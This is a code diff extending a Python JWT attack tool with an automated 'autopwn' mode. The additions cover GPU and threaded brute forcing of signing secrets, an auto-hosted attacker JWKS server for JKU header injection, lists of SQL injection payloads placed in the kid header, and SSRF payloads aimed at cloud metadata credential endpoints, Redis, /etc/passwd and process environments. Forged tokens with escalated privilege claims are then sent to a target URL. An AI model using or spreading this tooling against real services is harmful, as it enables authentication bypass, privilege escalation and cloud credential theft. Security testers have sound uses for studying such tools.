@@ -10,6 +10,11 @@ import sys
 import subprocess
 import re
 import time
+import threading
+import socket
+import http.server
+import tempfile
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric import rsa
@@ -27,6 +32,7 @@ CONFIG = {
     "autopwn":        False,  # --autopwn: run all attacks non-interactively
     "escalate_role":  None,   # --escalate-role: auto-set privilege claims to this value
     "strip_exp":      False,  # --strip-exp: remove nbf/iat and extend exp before signing
+    "use_hashcat":    False,  # --hashcat: use GPU hashcat instead of Python threaded BF
 }
 
 
@@ -130,6 +136,56 @@ def manual_none_token(header_dict, payload_dict):
         json.dumps(payload_dict, separators=(",", ":")).encode()
     ).rstrip(b'=').decode()
     return f"{h}.{p}."
+
+
+# ──────────────────────────────────────────────────────────────
+#  PHASE 3 HELPERS
+# ──────────────────────────────────────────────────────────────
+
+def find_free_port(preferred=8888):
+    """Return preferred port if free, otherwise let OS assign one."""
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        try:
+            s.bind(("0.0.0.0", preferred))
+            return preferred
+        except OSError:
+            s.bind(("0.0.0.0", 0))
+            return s.getsockname()[1]
+
+
+def get_lan_ip():
+    """Detect the machine's LAN IP (works even without internet)."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.connect(("8.8.8.8", 80))
+            return s.getsockname()[0]
+    except Exception:
+        return "127.0.0.1"
+
+
+def start_jwks_server(jwks_data, port=8888):
+    """
+    Spin up a lightweight HTTP server (stdlib only) to serve JWKS JSON.
+    Responds to ANY GET path with the JWKS — handles both / and /.well-known/jwks.json.
+    Returns the running HTTPServer instance (caller must call .shutdown() when done).
+    """
+    jwks_bytes = json.dumps(jwks_data).encode()
+
+    class JWKSHandler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.end_headers()
+            self.wfile.write(jwks_bytes)
+
+        def log_message(self, fmt, *args):
+            pass  # silence request logs — keep terminal clean
+
+    server = http.server.HTTPServer(("0.0.0.0", port), JWKSHandler)
+    t = threading.Thread(target=server.serve_forever, daemon=True)
+    t.start()
+    return server
 
 def interactive_edit_dict(title, d):
     # AUTOPWN MODE — skip all interaction; optionally escalate role-related claims
@@ -524,28 +580,100 @@ def attack_weak_signing_key(token, wordlist, url=None):
 
     wordlist = os.path.expanduser(wordlist)
 
-    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
-        for line in f:
-            secret = line.strip()
+    # ── hashcat (GPU) path ──────────────────────────────────────
+    if CONFIG.get("use_hashcat"):
+        print(Fore.CYAN + "[*] 🎮 Using hashcat (GPU mode) for cracking...")
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as tf:
+            tf.write(token + "\n")
+            token_file = tf.name
+        try:
+            result = subprocess.run(
+                ["hashcat", "-a", "0", "-m", "16500", "--quiet", token_file, wordlist],
+                capture_output=True, text=True, timeout=3600
+            )
+            output = result.stdout + result.stderr
+            cracked = None
+            for line in output.splitlines():
+                # hashcat format for mode 16500: <token>:<secret>
+                if line.count(".") >= 2 and ":" in line:
+                    cracked = line.split(":")[-1].strip()
+                    break
+            if cracked:
+                print(Fore.GREEN + f"[+] hashcat cracked secret: {cracked}")
+                _use_cracked_secret(token, cracked, algorithm, header, url)
+            else:
+                print(Fore.RED + "[-] hashcat did not crack the secret.")
+                if result.returncode not in (0, 1):
+                    print(Fore.RED + f"[!] hashcat stderr: {result.stderr[:300]}")
+        except FileNotFoundError:
+            print(Fore.RED + "[!] hashcat not found in PATH — falling back to Python threaded mode")
+            CONFIG["use_hashcat"] = False  # retry below
+        finally:
             try:
-                decoded = jwt.decode(token, secret, algorithms=[algorithm])
-                print(Fore.GREEN + f"[+] Weak secret found: {secret}")
+                os.unlink(token_file)
+            except OSError:
+                pass
+        if CONFIG.get("use_hashcat"):
+            return  # hashcat ran (hit or miss) — done
 
-                # Now allow user to edit payload interactively
-                print(Fore.CYAN + "\n[+] Edit JWT Payload:")
-                modified_payload = interactive_edit_dict("Token payload", decoded)
+    # ── Python threaded brute force ─────────────────────────────
+    print(Fore.CYAN + "[*] ⚡ Threaded brute force (50 workers) starting...")
+    found_event  = threading.Event()
+    found_result = [None]
+    lock         = threading.Lock()
 
-                # Re-encode token with modified payload and secret
-                modified_token = jwt.encode(modified_payload, secret, algorithm=algorithm)
+    def try_secret(secret):
+        if found_event.is_set():
+            return None
+        try:
+            jwt.decode(token, secret, algorithms=[algorithm],
+                       options={"verify_exp": False})
+            with lock:
+                if not found_event.is_set():
+                    found_event.set()
+                    found_result[0] = secret
+            return secret
+        except (jwt.InvalidSignatureError, jwt.DecodeError):
+            return None
+        except Exception:
+            return None
 
-                print_result("Weak Signing Key", modified_token, modified_payload, header)
-                check_url(modified_token, url)
-                return
+    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
+        secrets = [ln.strip() for ln in f if ln.strip()]
 
-            except jwt.InvalidSignatureError:
-                continue
+    print(Fore.CYAN + f"[*] Loaded {len(secrets):,} candidates from wordlist")
 
-    print(Fore.RED + "[-] No valid secret key found.")
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        futures = {executor.submit(try_secret, s): s for s in secrets}
+        checked = 0
+        for future in as_completed(futures):
+            checked += 1
+            if found_event.is_set():
+                executor.shutdown(wait=False, cancel_futures=True)
+                break
+            if checked % 5000 == 0:
+                print(Fore.CYAN + f"[*] Checked {checked:,}/{len(secrets):,}...", end="\r")
+
+    if found_result[0]:
+        secret = found_result[0]
+        print(Fore.GREEN + f"\n[+] ✅ Secret cracked: {secret}")
+        _use_cracked_secret(token, secret, algorithm, header, url)
+    else:
+        print(Fore.RED + f"\n[-] No secret found in {len(secrets):,} candidates.")
+
+
+def _use_cracked_secret(token, secret, algorithm, header, url):
+    """Edit payload and re-sign once a secret is cracked."""
+    try:
+        decoded = jwt.decode(token, secret, algorithms=[algorithm],
+                             options={"verify_exp": False})
+    except Exception:
+        decoded = decode_token(token)
+    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
+    modified_payload = interactive_edit_dict("Token payload", decoded)
+    modified_token   = jwt.encode(modified_payload, secret, algorithm=algorithm)
+    print_result("Weak Signing Key (Cracked)", modified_token, modified_payload, header)
+    check_url(modified_token, url)
 
 def attack_jwk_header_injection(token, url=None):
     private_key = generate_rsa_keypair()
@@ -571,9 +699,9 @@ def attack_jwk_header_injection(token, url=None):
     check_url(modified_token, url)
 
 def attack_jku_header_injection(token, url=None):
-    private_key = generate_rsa_keypair()
+    private_key     = generate_rsa_keypair()
     decoded_payload = decode_token(token)
-    decoded_header = get_header(token)
+    decoded_header  = get_header(token)
 
     print(Fore.CYAN + "\n[+] Edit JWT Header:")
     modified_header = interactive_edit_dict("Token header", decoded_header)
@@ -581,28 +709,64 @@ def attack_jku_header_injection(token, url=None):
     modified_payload = interactive_edit_dict("Token payload", decoded_payload)
 
     pub = private_key.public_key().public_numbers()
-    e = base64.urlsafe_b64encode(pub.e.to_bytes((pub.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()
-    n = base64.urlsafe_b64encode(pub.n.to_bytes((pub.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()
+    e   = base64.urlsafe_b64encode(pub.e.to_bytes((pub.e.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()
+    n   = base64.urlsafe_b64encode(pub.n.to_bytes((pub.n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()
 
-    kid = modified_header.get("kid", "custom_kid")
-    jwk = {
-        "kty": "RSA",
-        "e": e,
-        "n": n,
-        "kid": kid
-    }
-    print(Fore.CYAN + "[*] Suggested JWK to host at JKU URL:")
-    print(Fore.YELLOW + json.dumps({"keys": [jwk]}, indent=4))
-    input(Fore.CYAN + "Press Enter once you've hosted the JWK at a Website or Server...")
+    kid  = modified_header.get("kid", "custom_kid")
+    jwk  = {"kty": "RSA", "e": e, "n": n, "kid": kid}
+    jwks = {"keys": [jwk]}
 
-    jku_url = input(Fore.CYAN + "[?] Enter the Web URL to use in the JKU header: ").strip()
+    # ── Auto-host the JWKS (no external service needed) ──────────
+    jku_url = None
+    server  = None
+    port    = find_free_port(8888)
+
+    if CONFIG.get("autopwn"):
+        # Autopwn: silently start server, use LAN IP
+        try:
+            server  = start_jwks_server(jwks, port=port)
+            jku_url = f"http://{get_lan_ip()}:{port}/.well-known/jwks.json"
+            print(Fore.GREEN + f"[AUTOPWN] 🌐 JWKS server auto-started: {jku_url}")
+        except Exception as ex:
+            print(Fore.YELLOW + f"[AUTOPWN] Could not start JWKS server: {ex} — skipping JKU")
+            return
+    else:
+        try:
+            server   = start_jwks_server(jwks, port=port)
+            lan_ip   = get_lan_ip()
+            auto_url = f"http://{lan_ip}:{port}/.well-known/jwks.json"
+            print(Fore.GREEN + f"\n[+] 🌐 JWKS server started automatically!")
+            print(Fore.GREEN + f"[+] Serving at: {auto_url}")
+            print(Fore.CYAN  + "[*] The target server must be able to reach your machine at this IP.")
+            use_auto = input(Fore.CYAN + "[?] Use this auto-hosted URL? [Y/n]: ").strip().lower()
+            if use_auto == "n":
+                server.shutdown()
+                server = None
+                print(Fore.YELLOW + "[*] JWKS content to host manually:")
+                print(Fore.YELLOW + json.dumps(jwks, indent=4))
+                input(Fore.CYAN + "Press Enter once you've hosted the JWKS...")
+                jku_url = input(Fore.CYAN + "[?] Enter your hosted JWKS URL: ").strip()
+            else:
+                jku_url = auto_url
+        except Exception as ex:
+            print(Fore.YELLOW + f"[!] Could not auto-host JWKS server: {ex}")
+            print(Fore.YELLOW + "[*] JWKS content to host manually:")
+            print(Fore.YELLOW + json.dumps(jwks, indent=4))
+            input(Fore.CYAN + "Press Enter once you've hosted the JWKS...")
+            jku_url = input(Fore.CYAN + "[?] Enter your hosted JWKS URL: ").strip()
+
     modified_header["jku"] = jku_url
     modified_header["kid"] = kid
     modified_header["alg"] = "RS256"
 
     modified_token = jwt.encode(modified_payload, private_key, algorithm='RS256', headers=modified_header)
-    print_result("JKU Header Injection", modified_token, modified_payload, modified_header)
+    print_result("JKU Header Injection (auto-hosted JWKS)", modified_token, modified_payload, modified_header)
     check_url(modified_token, url)
+
+    if server and not CONFIG.get("autopwn"):
+        input(Fore.CYAN + "\n[?] Press Enter to shut down the JWKS server...")
+        server.shutdown()
+        print(Fore.YELLOW + "[*] JWKS server stopped.")
 
 def attack_kid_traversal(token, url=None):
     decoded = decode_token(token)
@@ -631,6 +795,84 @@ def attack_kid_traversal(token, url=None):
             check_url(forged_token, url)
         except Exception as e:
             print(Fore.RED + f"[!] Error with KID path '{kid}': {str(e)}")
+
+
+def attack_kid_sqli(token, url=None):
+    """
+    KID SQL Injection — inject SQL payloads into the kid header.
+    When the server uses kid to query a DB for the signing key, UNION SELECT
+    lets the attacker control the returned key value, making signature forgery trivial.
+    """
+    decoded = decode_token(token)
+    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
+    modified_payload = interactive_edit_dict("Token payload", decoded)
+
+    # (kid_payload, secret_used_to_sign)
+    # The secret must match what the SQL injection makes the DB return
+    sqli_payloads = [
+        ("' UNION SELECT 'secret'-- -",               "secret"),
+        ("' UNION SELECT 'hacked'-- -",               "hacked"),
+        ("\" UNION SELECT 'secret'-- -",              "secret"),
+        ("' UNION SELECT 'secret' FROM dual-- -",     "secret"),
+        ("1 UNION SELECT 'secret'-- -",               "secret"),
+        ("' OR '1'='1",                               ""),
+        ("' OR 1=1-- -",                              ""),
+        ("admin'-- -",                                ""),
+        ("' UNION SELECT NULL-- -",                   ""),
+        ("'; SELECT 'secret'-- -",                    "secret"),
+    ]
+
+    print(Fore.CYAN + f"\n[*] Testing {len(sqli_payloads)} KID SQL Injection payloads...")
+    for kid_val, secret in sqli_payloads:
+        try:
+            hdr          = {"kid": kid_val, "alg": "HS256"}
+            forged_token = jwt.encode(modified_payload, secret, algorithm='HS256', headers=hdr)
+            print_result(
+                f"KID SQLi  kid={kid_val!r}  secret={secret!r}",
+                forged_token, modified_payload, hdr
+            )
+            check_url(forged_token, url)
+        except Exception as e:
+            print(Fore.RED + f"[!] Error with SQLi payload '{kid_val}': {e}")
+
+
+def attack_kid_ssrf(token, url=None):
+    """
+    KID SSRF — set kid to internal/metadata URLs.
+    When the server fetches the key from the kid URL it makes an outbound request,
+    which can be redirected to internal services (AWS metadata, Redis, etc.).
+    """
+    decoded = decode_token(token)
+    print(Fore.CYAN + "\n[+] Edit JWT Payload:")
+    modified_payload = interactive_edit_dict("Token payload", decoded)
+
+    ssrf_payloads = [
+        "http://169.254.169.254/latest/meta-data/",                           # AWS IMDSv1
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # AWS IAM role
+        "http://metadata.google.internal/computeMetadata/v1/",                # GCP metadata
+        "http://100.100.100.200/latest/meta-data/",                           # Alibaba Cloud
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",    # Azure IMDS
+        "http://127.0.0.1:80/",
+        "http://localhost:80/",
+        "http://127.0.0.1:8080/",
+        "http://127.0.0.1:6379/",                                             # Redis
+        "http://127.0.0.1:9200/",                                             # Elasticsearch
+        "http://127.0.0.1:5984/",                                             # CouchDB
+        "file:///etc/passwd",
+        "file:///etc/hosts",
+        "file:///proc/self/environ",
+        "dict://127.0.0.1:6379/info",                                         # Redis via DICT
+    ]
+
+    print(Fore.CYAN + f"\n[*] Testing {len(ssrf_payloads)} KID SSRF payloads...")
+    for ssrf_kid in ssrf_payloads:
+        try:
+            hdr          = {"kid": ssrf_kid, "alg": "HS256"}
+            forged_token = jwt.encode(modified_payload, '', algorithm='HS256', headers=hdr)
+            print_result(f"KID SSRF → {ssrf_kid}", forged_token, modified_payload, hdr)
+            check_url(forged_token, url)
+        except Exception as e:
+            print(Fore.RED + f"[!] Error with SSRF payload '{ssrf_kid}': {e}")
 
 
 def jwt_algorithm_confusion_attack(token, url=None):
@@ -881,12 +1123,15 @@ def run_autopwn(token, url, wordlist=None):
     print()
 
     autopwn_attacks = [
-        ("Null Signature",             attack_null_signature),
-        ("Unverified Signature",       attack_unverified_signature),
-        ("alg:none \u2014 7 case variants", attack_flawed_verification),
-        ("JWK Header Injection",       attack_jwk_header_injection),
-        ("KID Path Traversal",         attack_kid_traversal),
-        ("ES256 Psychic Signature",    attack_es256_psychic_signature),
+        ("Null Signature",              attack_null_signature),
+        ("Unverified Signature",        attack_unverified_signature),
+        ("alg:none \u2014 7 variants",  attack_flawed_verification),
+        ("JWK Header Injection",        attack_jwk_header_injection),
+        ("JKU Header Injection",        attack_jku_header_injection),
+        ("KID Path Traversal",          attack_kid_traversal),
+        ("KID SQL Injection",           attack_kid_sqli),
+        ("KID SSRF",                    attack_kid_ssrf),
+        ("ES256 Psychic Signature",     attack_es256_psychic_signature),
     ]
     if wordlist:
         autopwn_attacks.append(
@@ -905,8 +1150,7 @@ def run_autopwn(token, url, wordlist=None):
     print(Fore.YELLOW + f"\n{chr(9552) * 64}")
     print(Fore.YELLOW + "[AUTOPWN] Scan complete.")
     print(Fore.YELLOW + "[AUTOPWN] Skipped (require manual input):")
-    print(Fore.YELLOW + "   \u21b7 JKU Header Injection  (needs external JWKS server URL)")
-    print(Fore.YELLOW + "   \u21b7 Algorithm Confusion    (needs key file or second token)")
+    print(Fore.YELLOW + "   \u21b7 Algorithm Confusion  (needs key file or second token for sig2n)")
     print(Fore.YELLOW + f"{chr(9552) * 64}\n")
 
 
@@ -923,6 +1167,7 @@ def main():
     parser.add_argument("--autopwn",          action="store_true", help="Run ALL automatable attacks non-interactively and test each against --url")
     parser.add_argument("--escalate-role",    metavar="ROLE", help="In autopwn mode, auto-set role/admin/sub claims to this value (e.g. admin)")
     parser.add_argument("--strip-exp",        action="store_true", help="Remove nbf/iat and push exp 10 years forward before signing every token")
+    parser.add_argument("--hashcat",          action="store_true", help="Use GPU hashcat for brute force instead of Python threaded mode")
     args = parser.parse_args()
 
     # Populate global config from parsed args
@@ -933,6 +1178,7 @@ def main():
     CONFIG["autopwn"]        = args.autopwn
     CONFIG["escalate_role"]  = args.escalate_role
     CONFIG["strip_exp"]      = args.strip_exp
+    CONFIG["use_hashcat"]    = args.hashcat
 
     # Always scan payload for embedded secrets on load
     scan_token_secrets(args.token)
@@ -946,12 +1192,14 @@ def main():
         "1": ("Unverified Signature",                            attack_unverified_signature),
         "2": ("Flawed Signature Verification (alg:none)",        attack_flawed_verification),
         "3": ("Weak Signing Key Brute Force",                    lambda t, u: attack_weak_signing_key(t, args.wordlist, u)),
-        "4": ("JWK Header Injection",                            attack_jwk_header_injection),
-        "5": ("JKU Header Injection",                            attack_jku_header_injection),
-        "6": ("KID Header Path Traversal",                       attack_kid_traversal),
-        "7": ("Algorithm Confusion (Public Key as HMAC)",        jwt_algorithm_confusion_attack),
-        "8": ("ES256 Psychic Signature Bypass (CVE-2022-21449)", attack_es256_psychic_signature),
-        "9": ("Null Signature (Signature Stripping)",            attack_null_signature),
+        "4":  ("JWK Header Injection",                            attack_jwk_header_injection),
+        "5":  ("JKU Header Injection (auto-hosted JWKS)",         attack_jku_header_injection),
+        "6":  ("KID Header Path Traversal",                       attack_kid_traversal),
+        "7":  ("Algorithm Confusion (Public Key as HMAC)",        jwt_algorithm_confusion_attack),
+        "8":  ("ES256 Psychic Signature Bypass (CVE-2022-21449)", attack_es256_psychic_signature),
+        "9":  ("Null Signature (Signature Stripping)",            attack_null_signature),
+        "10": ("KID SQL Injection",                               attack_kid_sqli),
+        "11": ("KID SSRF",                                        attack_kid_ssrf),
     }
 
     print(Fore.CYAN + "[*] Choose an attack method:")
